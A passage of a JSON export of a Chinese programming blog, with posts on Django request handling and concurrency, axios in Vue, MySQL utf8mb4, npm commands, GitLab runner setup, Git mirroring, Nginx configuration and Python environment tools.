清晰的标题 3.2 准确的正文 用清晰的语言描述你遇到的问题 提供软件环境，包括操作系统、数据库等相关软件及其版本号 问题是否可以重现，采用什么方式重现 采用了什么措施解决问题，最终结果（可提供日志、程序、截图等描述） 尽可能提供问题相关的可分析文件，包括日志、截图和Core dump等 不要长篇大论，简明扼要，描述主要问题 4. 主动型 主动型的提问，是当你获取信息时，自发产生的一系列思考。如果不管读到什么、听到什么，都不假思索地全盘接收，久而久之，你就会把别人的观点当成自己的观点。\n最终失去独立思考的能力，失去批判性思维。批判性思维的核心就是需要创造性提出问题，然后合理地分析论证。\n主动提问是加深理解、激发自己思考的有效方式。\n4.1 提问的思路 论题和结论是什么 理由是什么 哪些词语意思不明确 什么是价值观假设和描述性假设 推理过程中有没有缪误 证据的效力如何 有没有替代原因 有什么重要信息被省略了 能得出哪些合理的结论 ","description":"","id":450,"section":"post","tags":["博文","思考","问题"],"title":"怎么样提一个好问题","uri":"https://www.chenshaowen.com/blog/how-to-raise-a-good-question.html"},{"content":" 在 Django 中，request 包含了一次请求的全部信息。后端处理逻辑经常需要用到 request 中的信息。比如， DRF 框架中想要随时能够获取到 request，或者将一些参数全局传递。Django 第三方 App 中有一些工具可以满足要求，但它们并不是安全可靠的。意思是，如果 Django 启动时，使用了多线程或协程，在获取 request 时，可能会发生错误。这显然是不能接受的。下面是一个安全可靠的实现版本，让你在任意位置都能获取 request 对象。\n1. 实现 utils/local.py 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Thread-local/Greenlet-local objects Thread-local/Greenlet-local objects support the management of thread-local/greenlet-local data. If you have data that you want to be local to a thread/greenlet, simply create a thread-local/greenlet-local object and use its attributes: \u0026gt;\u0026gt;\u0026gt; mydata = Local() \u0026gt;\u0026gt;\u0026gt; mydata.number = 42 \u0026gt;\u0026gt;\u0026gt; mydata.number 42 \u0026gt;\u0026gt;\u0026gt; hasattr(mydata, \u0026#39;number\u0026#39;) True \u0026gt;\u0026gt;\u0026gt; hasattr(mydata, \u0026#39;username\u0026#39;) False Reference : from threading import local \u0026#34;\u0026#34;\u0026#34; try: from greenlet import getcurrent as get_ident except ImportError: try: from thread import get_ident except ImportError: from _thread import get_ident __all__ = [\u0026#34;local\u0026#34;, \u0026#34;Local\u0026#34;] class Localbase(object): __slots__ = (\u0026#39;__storage__\u0026#39;, \u0026#39;__ident_func__\u0026#39;) def __new__(cls, *args, **kwargs): self = object.__new__(cls, *args, **kwargs) object.__setattr__(self, \u0026#39;__storage__\u0026#39;, {}) object.__setattr__(self, \u0026#39;__ident_func__\u0026#39;, get_ident) return self class Local(Localbase): def __iter__(self): ident = self.__ident_func__() return iter(self.__storage__[ident].items()) def __release_local__(self): self.__storage__.pop(self.__ident_func__(), None) def __getattr__(self, name): ident = self.__ident_func__() try: return self.__storage__[ident][name] except KeyError: raise AttributeError(name) def __setattr__(self, name, value): if name in (\u0026#39;__storage__\u0026#39;, \u0026#39;__ident_func__\u0026#39;): raise AttributeError( \u0026#34;%r object attribute \u0026#39;%s\u0026#39; is read-only\u0026#34; % (self.__class__.__name__, name)) ident = self.__ident_func__() storage = self.__storage__ try: storage[ident][name] = value except KeyError: storage[ident] = {name: value} def __delattr__(self, name): if name in (\u0026#39;__storage__\u0026#39;, \u0026#39;__ident_func__\u0026#39;): raise AttributeError( \u0026#34;%r object attribute \u0026#39;%s\u0026#39; is read-only\u0026#34; % (self.__class__.__name__, name)) ident = self.__ident_func__() try: del self.__storage__[ident][name] if len(self.__storage__[ident]) == 0: self.__release_local__() except KeyError: raise AttributeError(name) local = Local() if __name__ == \u0026#39;__main__\u0026#39;: def display(id): # import time local.id = id for i in range(3): print get_ident(), local.id, \u0026#34;\\n\u0026#34; # time.sleep(1) def gree(id): import gevent t = [] for i in range(10): t.append(gevent.spawn(display, \u0026#34;%s-%s\u0026#34; % (id, i))) gevent.joinall(t) # test one # l1 = Local() # l2 = Local() # l.xxx = 1 # print l.xxx # print l1.xxx # print l2.xxx # test two # import gevent # t = [] # for i in range(10): # g = gevent.spawn(display, i) # t.append(g) # gevent.joinall(t) # test three import threading t = [] for i in range(10): t.append(threading.Thread(target=gree, args=(i,))) [th.start() for th in t] [th.join() for th in t] utils/request_middlewares.py 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 # -*- coding: utf-8 -*- from django.dispatch import Signal from django.conf import settings from utils.local import local class AccessorSignal(Signal): allowed_receiver = \u0026#39;utils.request_middlewares.RequestProvider\u0026#39; def __init__(self, providing_args=None): Signal.__init__(self, providing_args) def connect(self, receiver, sender=None, weak=True, dispatch_uid=None): receiver_name = \u0026#39;.\u0026#39;.join( [receiver.__class__.__module__, receiver.__class__.__name__] ) if receiver_name != self.allowed_receiver: raise Exception( u\u0026#34;%s is not allowed to connect\u0026#34; % receiver_name) if not self.receivers: Signal.connect(self, receiver, sender, weak, dispatch_uid) request_accessor = AccessorSignal() class RequestProvider(object): \u0026#34;\u0026#34;\u0026#34; @summary: request事件接收者 \u0026#34;\u0026#34;\u0026#34; def __init__(self): request_accessor.connect(self) def process_request(self, request): \u0026#34;\u0026#34;\u0026#34; 这里可以在 request 上添加自定义的一些数据、处理逻辑 \u0026#34;\u0026#34;\u0026#34; local.current_request = request return None def process_view(self, request, view_func, view_args, view_kwargs): your_args = view_kwargs.get(\u0026#34;your_args\u0026#34;, \u0026#34;\u0026#34;) if not your_args: your_args = (request.POST.get(\u0026#39;your_args\u0026#39;) or request.GET.get(\u0026#39;your_args\u0026#39;)) or \u0026#34;\u0026#34; request.your_args = your_args def process_response(self, request, response): if hasattr(local, \u0026#39;current_request\u0026#39;): assert request is local.current_request del local.current_request return response def __call__(self, **kwargs): if not hasattr(local, \u0026#39;current_request\u0026#39;): raise Exception( u\u0026#34;get_request can\u0026#39;t be called in a new thread.\u0026#34;) return local.current_request def get_request(): if hasattr(local, \u0026#39;current_request\u0026#39;): return local.current_request else: raise Exception(u\u0026#34;get_request: current thread hasn\u0026#39;t request.\u0026#34;) def get_x_request_id(): x_request_id = \u0026#39;\u0026#39; http_request = get_request() if hasattr(http_request, \u0026#39;META\u0026#39;): meta = http_request.META x_request_id = (meta.get(\u0026#39;HTTP_X_REQUEST_ID\u0026#39;, \u0026#39;\u0026#39;) if isinstance(meta, dict) else \u0026#39;\u0026#39;) return x_request_id 2. 使用 1 2 3 4 MIDDLEWARE_CLASSES = ( ... \u0026#39;utils.request_middlewares.RequestProvider\u0026#39;, ... ) 1 2 3 4 5 from utils.request_middlewares import local def my_function(): local.current_request pass ","description":"","id":451,"section":"post","tags":["博文","Django","Demo"],"title":"如何在 Django 中任意安全获取 request","uri":"https://www.chenshaowen.com/blog/how-to-secure-get-request-in-django.html"},{"content":"1. axios 安装 使用 npm 安装\n1 npm install axios --save 全局注册有两种方法：\n绑定到原型上 1 2 import axios from \u0026#39;axios\u0026#39; Vue.prototype.axios = axios 这种方法，每个 Vue 对象都会新增一个 axios 对象。\n1 2 3 this.axios.post(apiUrl).then((res) =\u0026gt; { //do something }) 挂载到 windows 对象上 在 DOM 的任意地方，都能使用 axios 函数。\n1 2 import axios from \u0026#39;axios\u0026#39; window.axios = axios; 1 2 3 axios.post(apiUrl).then((res) =\u0026gt; { //do something }) 2. axios 配置 为了配合 Django 的 CSRF 校验，需要在 axios 中进行配置。\n1 2 3 4 var axiosDefaults = require(\u0026#34;axios/lib/defaults\u0026#34;); axiosDefaults.xsrfCookieName = \u0026#34;csrftoken\u0026#34;; axiosDefaults.xsrfHeaderName = \u0026#34;X-CSRFToken\u0026#34;; axiosDefaults.withCredentials = true; 3. axios 拦截器 拦截器可以对请求做一些公共的处理，比如异常、返回数据的格式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 axios.interceptors.response.use( response =\u0026gt; { return response; }, error =\u0026gt; { if (error.response) { switch (error.response.status) { case 500: // do something break; case 402: // do something break; } } return Promise.reject(error.response.data); // 返回接口返回的错误信息 }); 4. axios 传参 4.1 get 请求 1 2 3 4 5 6 let params = { key1: \u0026#39;value1\u0026#39;, key2: \u0026#39;value2\u0026#39; } axios.get(apiUrl, { params }) //数据编码形式： /?key1=value1\u0026amp;key2=value2 4.2 POST 请求 x-www-form-urlencoded axios 默认将 javascript 对象序列化为 JSON 。以 application/x-www-form-urlencoded 格式发送数据。\n1 2 3 4 5 let params = new URLSearchParams() params.append(\u0026#39;key1\u0026#39;, \u0026#39;value1\u0026#39;) params.append(\u0026#39;key2\u0026#39;, \u0026#39;value2\u0026#39;) axios.post(apiUrl, params) //数据编码形式：key1=value1\u0026amp;key2=value2 1 2 3 4 5 6 7 let qs = require(\u0026#39;qs\u0026#39;) let params = { key1: \u0026#39;value1\u0026#39;, key2: \u0026#39;value2\u0026#39; } axios.post(apiUrl, qs.stringify(params)); //数据编码形式：key1=value1\u0026amp;key2=value2 1 2 3 4 5 6 7 8 9 10 11 12 13 import qs from \u0026#39;qs\u0026#39;; let data = { key1: \u0026#39;value1\u0026#39;, key2: \u0026#39;value2\u0026#39; } let options = { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, data: qs.stringify(data), url: apiUrl }; axios(options); // 数据编码形式： key1=value1\u0026amp;key2=value2 4.3 Form data 1 2 3 4 5 6 7 8 axios.post(apiUrl, { key1: \u0026#39;value1\u0026#39;, key2: \u0026#39;value2\u0026#39; }, { headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;multipart/form-data\u0026#39; } }) 4.4 request payload 1 2 3 4 let formData = new FormData() formData.append(\u0026#39;key1\u0026#39;, \u0026#39;value1\u0026#39;) formData.append(\u0026#39;key2\u0026#39;, \u0026#39;value2\u0026#39;) axios.post(apiUrl, formData) 5. Django 后台不能区分 ajax 和非 ajax 查看源码 django/http/request.py 文件可以看到，Django 是通过请求头部的标识来区分是否为 Ajax 请求。\n1 2 def is_ajax(self): return self.META.get(\u0026#39;HTTP_X_REQUESTED_WITH\u0026#39;) == \u0026#39;XMLHttpRequest\u0026#39; axios 处理办法\n1 2 3 axiosDefaults.headers.common = { \u0026#39;X-Requested-With\u0026#39;: \u0026#39;XMLHttpRequest\u0026#39; } 6. 参考 https://github.com/axios/axios/blob/master/README.md#using-applicationx-www-form-urlencoded-format ","description":"","id":452,"section":"post","tags":["博文","前端","接口","API","Vuejs","Axios"],"title":"Vue 中使用 axios","uri":"https://www.chenshaowen.com/blog/using-axios-in-vue.html"},{"content":" 前面一部分主要讲乐观锁和悲观锁。锁从数据库层面，保证了并发时的数据一致性。了解锁，有助于对并发解决方案的理解。后面一部分主要讲的是 Django 中，并发场景下，保证数据一致性的解决办法。\n1. 关于锁 1.1 乐观锁 乐观锁的出发点是，同一条数据很少会因为并发修改而产生冲突，适用于读多写少的场景，用以提高吞吐量。\n实现方式，读取一个字段，执行处理逻辑，当需要更新数据时，再次检查该字段是否和第一次读取一致。如果一致，则更新数据，否则拒绝更新，重新读取后再提交。\n1.2 悲观锁 悲观锁的出发点是，当一条数据正在被修改时，不允许其他任何关于这条数据的操作。\n实现方式，读取一个字段之后，加锁，不允许其他任何读、写操作。执行处理逻辑，更新数据完毕后，释放锁。\n1.3 比较 乐观锁的开销远低于悲观锁。\n悲观锁可能会导致死锁。当 A 锁定了 a 资源，需要 b 资源。而 b 被 B 锁定，正在等待 a 资源。此时，导致出现死锁。但是，可以通过设置超时来处理这个问题。\n悲观锁可以有效降低冲突后，重试的次数。\n乐观锁可以提高响应速度。\n2. Django 中的事务 Django 默认每条数据库操作都会被立即提交到数据库。\n这样会导致一个问题，如果有一系列的数据库操作构成，要么全部执行，要么就全部都不执行，怎么办？\n这时，就需要事务。将一系列数据库操作设置为一个事务，提交给数据库执行。\nDjango 提供 atomic 装饰器以开启事务。\natomic 使用一个参数来指定数据库的名字。如果不设置值，Django 就会使用系统默认的数据库。\n2.1 整个 View 函数开启事务 1 2 3 4 5 6 from django.db import transaction @transaction.atomic def viewfunc(request): # This code executes inside a transaction. do_stuff() 2.2 部分函数 do_more_stuff() 开启事务。 1 2 3 4 5 6 7 8 9 from django.db import transaction def viewfunc(request): # This code executes in autocommit mode (Django\u0026#39;s default). do_stuff() with transaction.atomic(): # This code executes inside a transaction. do_more_stuff() 2.3 不要在事务中处理异常 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from django.db import transaction def viewfunc(request): do_stuff() try: with transaction.commit_on_success(): do_more_stuff_1() # in transaction try: do_more_stuff_2() # not in transaction except: pass do_more_stuff_3() # in transaction except: pass 当退出原子块时，Django 会查看它是否正常退出或者是否有异常来确定是否提交或者回滚。\n如果你捕获并处理原子块中的异常，可以能会隐藏 Django 中发生问题的事实。这样可能会造成非预期的行为。\n3. 利用 F 函数更新运算 通常更新数据库的操作，需要将对象读取到内存。在内存中进行修改之后，再写回数据库。\n在内存中的操作，如果存在同时操作的情况，会导致运算逻辑错误。\nF() 函数的作用就是直接生成 SQL 语句，不必将需要更新的对象读取到内存。避免了并发导致的数据不一致问题。\n1 2 3 4 5 from django.db.models import F reporter = Reporters.objects.get(name=\u0026#39;OICQ\u0026#39;) reporter.stories_filed = F(\u0026#39;stories_filed\u0026#39;) + 1 reporter.save() 4. 利用 select_for_update 函数 select_for_update 使用的是悲观锁。\nselect for update 函数使用数据库查询语句， select ... for update 对数据库进行操作。\n这是数据库层面的，解决并发取数据后再修改的问题方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 def mark_as_readed(self, notification_id): # 让s elect for update 和 update 语句发生在一个完整的事务里面 with transaction.commit_on_success(): # 使用select_for_update 来保证并发请求同时只有一个请求在处理，其他的请求 # 等待锁释放 notification = Notification.objects.select_for_update().get(pk=notification_id) # 没有必要重复标记一个已经读过的通知 if notication.has_readed: return notification.has_readed = True notification.save() # 在这里更新我们的计数器，嗯，我感觉好极了 self.update_unread_count(-1) ","description":"","id":453,"section":"post","tags":["博文","Django","并发"],"title":"如何在 Django 中保证并发的数据一致性","uri":"https://www.chenshaowen.com/blog/how-to-ensure-concurrence-of-data-in-django.html"},{"content":"1. 什么是 utf8 理论上，utf8 使用 1-6 个字符，\n实际上，最新的 utf8 规范只使用一到四个字节，最大能编码21位，正好能够表示所有的 17个 Unicode 平面。\n2. 什么是 utf8mb4 utf8mb4 是 utf8 的超集，理论上原来使用 utf8，然后将字符集修改为 utf8mb4，也不会对已有的utf8 编码读取产生任何问题。\n3. MySQL 中的 utf8 MySQL 中的 utf8，只支持最长三个字节的 utf8 字符，也就是 Unicode 中的基本多文本平面。\n仅使用三个字符的原因可能是，基本多文种平面之外的字符很少用到。\n而在 MySQL 5.5.3 版本后，要在 Mysql 中保存 4 字节长度的 UTF-8 字符，就可以使用 utf8mb4 字符集了。例如可以用 utf8mb4 字符编码直接存储 emoj 表情，而不是存表情的替换字符。\n4. Django 解决 \\xF0\\x9F\\x90\\xAF 错误 如果在 MySQL 的 utf8 字符集上写入表情字符，就会提示 Incorrect string value: ’\\xF0\\x9F\\x90\\xAF’ for column ... 错误。\n解决办法就是，修改表中相关列或表的编码格式，然后在 Django 中配置访问数据库编码方式。由于 utf8mb4 是 utf8 的超集，兼容 utf8 的数据，不需要修改原来的数据，就可以正常的使用了。\n4.1 修改 MySQL 编码 查看表结构编码\n1 \u0026gt; SHOW VARIABLES WHERE Variable_name LIKE \u0026#39;character\\_set\\_%\u0026#39; OR Variable_name LIKE \u0026#39;collation%\u0026#39;; 回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 +--------------------------+-------------------+ | Variable_name | Value | +--------------------------+-------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | latin1 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | latin1 | | character_set_system | utf8 | | collation_connection | utf8_general_ci | | collation_database | latin1_swedish_ci | | collation_server | latin1_swedish_ci | +--------------------------+-------------------+ 修改表结构字符，按需修改\n1 2 3 4 5 6 # 修改某个数据库 ALTER DATABASE database_name CHARACTER SET = utf8mb4 COLLATE utf8mb4_unicode_ci; # 修改某个表 ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; # 修改某列 ALTER TABLE table_name CHANGE column_name column_name VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL; 4.2 Django 升级到 utf8mb4 配置 1 2 3 4 5 6 DATABASES = { \u0026#39;default\u0026#39;: { ... \u0026#39;OPTIONS\u0026#39;: {\u0026#39;charset\u0026#39;:\u0026#39;utf8mb4\u0026#39;}, }, } 4.3 修改 MySQL 配置[可选] C:\\ProgramData\\MySQL\\MySQL Server 5.6\\my.ini\n1 2 3 4 5 6 7 8 9 10 [client] default-character-set = utf8mb4 [mysql] default-character-set = utf8mb4 [mysqld] character-set-client-handshake = FALSE character-set-server = utf8mb4 collation-server = utf8mb4_unicode_ci 5. 参考 http://blog.manbolo.com/2014/03/31/using-emojis-in-django-model-fields https://docs.lvrui.io/2016/08/21/%E4%BF%AE%E6%94%B9MySQL%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%BAutf8mb4/ ","description":"","id":454,"section":"post","tags":["博文","Django","字符集","编码","表情包"],"title":"Django 中使用 utf8mb4 支持 emoji 表情","uri":"https://www.chenshaowen.com/blog/using-utf8mb4-in-django-to-support-emoji-expression.html"},{"content":"** 默认执行命名时，针对的是当前目录环境。如果加上 -g 参数，则表示针对的是全局生效。**\nnpm 升级 1 npm install npm -g 查看当前版本 1 npm -v 查看 npm 源配置 1 npm config get registry 修改 npm 源 1 2 npm config set registry http://registry.npm.taobao.org/ # npm config set registry https://registry.npmjs.org/ 临时指定 npm 安装源 1 npm install [package name] --registry=https://registry.npm.taobao.org 设置 proxy 1 npm config set proxy http://proxy.example.com:8080 查看 proxy 1 npm config get proxy 删除proxy 1 npm config delete proxy 查看所有配置 1 npm config list 列出安装的包 1 npm list 安装 packages.json 中描述的包 1 npm install 全局安装 1 npm install [package name] -g 局部安装 dependencies 1 npm install [package name] --save 局部安装 devDependencies 1 npm install [package name] --save-dev 指定安装最新版本 1 npm install [package name]@latest --save 指定安装版本 1 npm install [package name]@1.0.0 --save 指定安装大于等于@1.0.0 小于 2.2.0 版本 1 npm install [package name]@\u0026#34;\u0026gt;=2.0.0 \u0026lt;1.0.0\u0026#34; --save 删除全局包 1 npm uninstall [package name] -g 删除局部包 1 npm uninstall [package name] 列出本地全部可更新包 1 npm outdated 升级全部包 1 npm update ","description":"","id":455,"section":"post","tags":["博文","命令","前端","NPM"],"title":"NPM 常用命令","uri":"https://www.chenshaowen.com/blog/common-commands-list-of-npm.html"},{"content":" 主要记录的是分析方法。\n1. 战略分析 麦肯锡七步成诗法\n陈述问题 分析问题 优先排序 指定详细的工作计划 进行关键分析 综合结果并建立有结构的结论 讲故事 2. 认识问题 大部分的问题是不能认识问题，unknown unknown。能够认识到问题、陈述问题，是解决问题的关键步骤。\n3. 分析问题的逻辑树方法和 MECE MECE 原则\n各部分之间相互独立 （Mutually Exclusive） 所有部分完全穷尽 （Collectively Exhaustive 3.1 构建逻辑树 分析问题时，对问题进行拆分。子问题之间满足 MECE 原则，逐层拆分，最后构建一个逻辑树。例如：\n利润下降 -\u0026gt;（收入下降，成本上升）\n收入下降，还可以继续拆分。\n收入下降 -\u0026gt; （销售量下降，销售单价下降）\n在拆分的过程中，可能还会遇到自己或团队的知识盲点，这时需要补齐知识。\n如果问题能按数学公式分解，那么将比较符合 MECE 原则。同时，也是比较常用的分解方法。比如，上面的例子，利润 = 收入 - 成本。\n4. 讲故事 先回答问题 后回答问题 适用目的 用于满足耐心不足的决策者 保证每个步骤能够达成一致 优势 - 听众能够快速了解关键战略方向 - 可以在前面简介介绍要点和逻辑 逐步推到得出结论，过程保证达成一致，则结果显而易见 使用场景 - 听众很清楚的了解现状和推导方式 - 很可能大家对结论已经有共识 - 听众时间有限耐心不足 - 听众对事实不是很熟悉 - 结论是较为容易引起争论，需要去详细推到论证的 - 听众是细节导向的 4.1 SCQM 讲故事方法 S - 背景\nC - 冲突\nQ - 核心问题\nM - 结论\nSCQM 和金字塔思维，搭建 Storyline\n5. 思路清晰最重要 讲问题和解决方案，不要罗列主干 发现问题，必须有明确的解决方案；提出资源需求，必须有明确的逻辑分析及执行路径 Storyline为王，请牢记 MECE 核心观点和 Storyline 是 leader/owner 的管理责任，不能授权外包 学会利用 \u0026rsquo;executive summary\u0026rsquo;，通过 \u0026lsquo;电梯场景\u0026rsquo; 测试和提炼汇报的精度与准度 6. 关于数据以数据呈现 用数据说话，管理者必须对业务全局数据视图有清晰的了解 数据服务观点及 Storyline，展现形式不符合阅读习惯 切记堆砌，非核心数据 backup 备查，不要影响汇报主线 ","description":"","id":456,"section":"post","tags":["博文","笔记","表达","思考"],"title":"战略思考与表达学习笔记","uri":"https://www.chenshaowen.com/blog/note-of-strategic-thinking-and-expression.html"},{"content":"1. 下载并配置 Runner 1.1 下载 Runner GitLab-CI 的 Runner 是一个 Go 写的程序包，可以去官网下载到本地。\n1 2 yum install -y wget wget -O /usr/local/bin/gitlab-runner https://gitlab-runner-downloads.s3.amazonaws.com/latest/binaries/gitlab-runner-linux-amd64 增加执行权限\n1 chmod +x /usr/local/bin/gitlab-runner 1.2 新增 runner 用户 运行 Runner 时，以 runner:runner 账户运行。\n1 2 groupadd -g 1234 runner useradd runner -u 1234 -g 1234 1.3 修改 pip 源 1 2 3 4 cat /etc/pip.conf [global] index-url= http://pypi.doubanio.com/simple/ trusted-host = pypi.doubanio.com 1.4 创建工作目录 1 mkdir -p /data/gitlab-data 2 注册 Runner 在项目的settings/ci_cd 页面，或者管理员的 /admin/runners 页面都可以找到 token。\ntoken 是 Runner 注册的凭证。如果是从项目获取的 token，那么这个 Runner 属于此项目，可以通过配置允许其他项目也可以使用。如果是从管理员页面获取的 token ，那么这个 Runner，所有项目可见，都可以使用。\n下面以项目的 Runner 为例：\n2.1 获取 token 在项目的 settings/ci_cd 页面\n需要获取图中模糊处理的两个参数：\nURL: http://gitlab.yourdomain.com/ token: XXXXXXXXXXXXXXXXXXX 2.2 注册 Runner 运行下面的命令，并按照提示输入相关信息。\n1 /usr/local/bin/gitlab-runner register Please enter the gitlab-ci coordinator URL (e.g. https://gitlab.com/): 输入 gitlab 的 url 地址\n1 http://gitlab.yourdomain.com/ Please enter the gitlab-ci token for this runner: 输入 token\n1 XXXXXXXXXXXXXXXXXXX Please enter the gitlab-ci description for this runner: 输入 Runner 描述\n1 MyShellRunner Please enter the gitlab-ci tags for this runner (comma separated): 输入 Runner 的标签：\n1 shell, linux Whether to run untagged builds [true/false]: 是否运行在没有 tag 的 build 上面。在配置 gitlab-ci 时，会有很多 job，每个 job 可以通过 tags 属性来选择 Runner。这里为 true 表示如果 job 没有配置 tags，也执行。\n1 true Whether to lock the Runner to current project [true/false]: 是否锁定 Runner 到当前项目\n1 false Please enter the executor: parallels, ssh, virtualbox, docker-ssh+machine, kubernetes, docker, docker-ssh, shell, docker+machine: 选择 executor，这里列出了很多 executor\n1 shell Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 3 运行 Runner 1 /usr/bin/gitlab-runner run --working-directory /data/gitlab-data --config /etc/gitlab-runner/config.toml --service gitlab-runner --user runner \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; 这里为了不修改 yml 配置，从之前的 Runner 迁移到 新 Runner。直接禁用共享的 Runner，使用 Specific Runner。如果愿意修改 yml，可以通过 tags 参数来控制执行的 Runner。\n剩下的就是在新的 Runner 上，配置合适的 CI 环境，比如 node、npm 即可。\n查看默认启动配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat /etc/systemd/system/gitlab-runner.service [Unit] Description=GitLab Runner After=syslog.target network.target ConditionFileIsExecutable=/usr/bin/gitlab-runner [Service] StartLimitInterval=5 StartLimitBurst=10 ExecStart=/usr/bin/gitlab-runner \u0026#34;run\u0026#34; \u0026#34;--working-directory\u0026#34; \u0026#34;/data/gitlab-data\u0026#34; \u0026#34;--config\u0026#34; \u0026#34;/etc/gitlab-runner/config.toml\u0026#34; \u0026#34;--service\u0026#34; \u0026#34;gitlab-runner\u0026#34; \u0026#34;--syslog\u0026#34; \u0026#34;--user\u0026#34; \u0026#34;runner\u0026#34; Restart=always RestartSec=120 [Install] WantedBy=multi-user.target 还可以通过 systemctl 管理 Runner\n1 systemctl restart gitlab-runner 4. 一些问题 4.1 注销 Runner 需要先找到 config.toml 文件中的 token，需要注意的是，这里的 token 和注册时不一样。\n1 2 3 4 5 6 7 8 9 10 cat /etc/gitlab-runner/config.toml concurrent = 1 check_interval = 0 [[runners]] name = \u0026#34;myshell\u0026#34; url = \u0026#34;http://gitlab.yourdomain.com/\u0026#34; token = \u0026#34;XXXXXXXXXXxxxxxxxxxxxxx\u0026#34; executor = \u0026#34;shell\u0026#34; [runners.cache] 1 gitlab-runner unregister --url http://gitlab.yourdomain.com/ --token XXXXXXXXXXxxxxxxxxxxxxx 4.2 SVN Can\u0026rsquo;t convert string from \u0026lsquo;UTF-8\u0026rsquo; 解决svn: Can\u0026rsquo;t convert string from \u0026lsquo;UTF-8\u0026rsquo; to native encoding问题\n1 2 locale export LC_ALL=zh_CN.UTF-8 5. 参考 https://docs.gitlab.com.cn/runner/register/ ","description":"","id":457,"section":"post","tags":["博文","GitLab","CI","DevOps"],"title":"GitLab CI 配置 Runner","uri":"https://www.chenshaowen.com/blog/gitlab-ci-configuring-runner.html"},{"content":" 由于目前使用的 Git 仓库即将无法使用，需要将仓库代码迁移到新的 Git 仓库。具体操作方法如下：\n1.登录新的仓库，然后创建仓库。\n创建后，新仓库地址: http://gitlab.your-new-domain.com/project.git\n2.克隆旧仓库镜像到本地：\n1 2 3 git clone --mirror http://gitlab.your-old-domain.com/project.git # 如果仅需要克隆 Branch 和 Tag，可以使用 --bare 参数替换 --mirror。 cd project.git 3.推送镜像到新仓库\n1 2 git remote set-url --push origin http://gitlab.your-new-domain.com/project.git git push --mirror tips:\n更新当前目录下全部仓库\nfetch_all.sh\n1 for d in ./*/ ; do (cd \u0026#34;$d\u0026#34; \u0026amp;\u0026amp; git fetch); done 打包当前目录下全部仓库\ntar_all.sh\n1 ls |xargs -i tar zcvf {}.tar.gz {} ","description":"","id":458,"section":"post","tags":["博文","Git"],"title":"如何同步备份 Git 仓库","uri":"https://www.chenshaowen.com/blog/how-to-synchronize-the-backup-of-git-repository.html"},{"content":"1. server_name 无效 现象：Nginx 反向代理了两个应用，配置详情如下。发现访问 b.chenshaowen.com 和 a.chenshaowen.com 时，返回的都是 A 服务的请求。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server { listen 80; server_name a.chenshaowen.com; location / { proxy_pass http://A; } } server { listen 8080; server_name b.chenshaowen.com; location / { proxy_pass http://B; } } 原因：当所有 server 的规则都不匹配时，Nginx 会采用第一条 server 配置。\n解决办法：在最前处，新增一条 server\n1 2 3 4 5 6 server { listen 80; server_name XX.chenshaowen.com; return 404; } # 其他 server 2. Nginx 增加密码验证 1.安装密码生成工具\n1 yum install httpd-tools 2.生成账号密码\n1 htpasswd -bc /your/password/file/path username password 3.Nginx 配置\n1 2 3 4 5 location / { auth_basic \u0026#34;input password\u0026#34;; auth_basic_user_file /your/password/file/path; ... } 4.重启 Nginx 服务\n1 2 3 4 nginx -s reload ``` 当再次访问时，Nginx 会弹出一个小框，提示输入密码。使用 username:password 即可登录、 ","description":"","id":459,"section":"post","tags":["博文","Nginx","配置"],"title":"Nginx 配置问题记录","uri":"https://www.chenshaowen.com/blog/nginx-configuration-problem-record.html"},{"content":"1. 非标准库 1.1 virtualenv virtualenv 是一个非常流行的用于创建独立的python libraries环境的工具。我强烈推荐你学习并了解它，因为他非常实用，并且应用广泛，很多人用它来搭建python开发环境。后面其他工具来主要与virtualenv来进行比较以说明差异。\nvirtualenv 通过安装一些列的可执行和库文件到某个目录（例如：env/)，然后通过修改环境变量PATH中可执行文件(bin目录)目录的先后顺序来实现其功能，比如将 env/bin/ 放到环境变量PATH的前面。然后将一个 python或python3的可执行文件放到 env/bin/目录下，由于python运行时，会优先搜索与其路径接近的相对目录位置，这样就可达成优先使用virtualenv创建的libraries目录的目的，运行activated进入virtualenv环境后，就可以通过pip安装libraries到env/环境下\n1.2 pyenv pyenv 用于创建独立的python版本环境。例如，有可能你想要分别测试你的代码在 python2.6、2.7、3.3、3.4、3.5版本下的运行情况，那么你就需要类似pyenv这样的工具来快速切换python版本。一旦激活pyenv环境，它就将 ~/.pyenv/shims中的值放到环境变量PATH的前面，用于覆盖默认的python、pip可执行文件目录。它不会copy可执行文件，它仅仅是通过一些脚本代码基于 PYENV_VERSION或.python-version文件 来决定使用哪个python可执行文件运行python程序。另外，也可以通过 pyenv install 来安装多个python版本。\n1.3 pyenv-virtualenv pyenv-virtualenv, 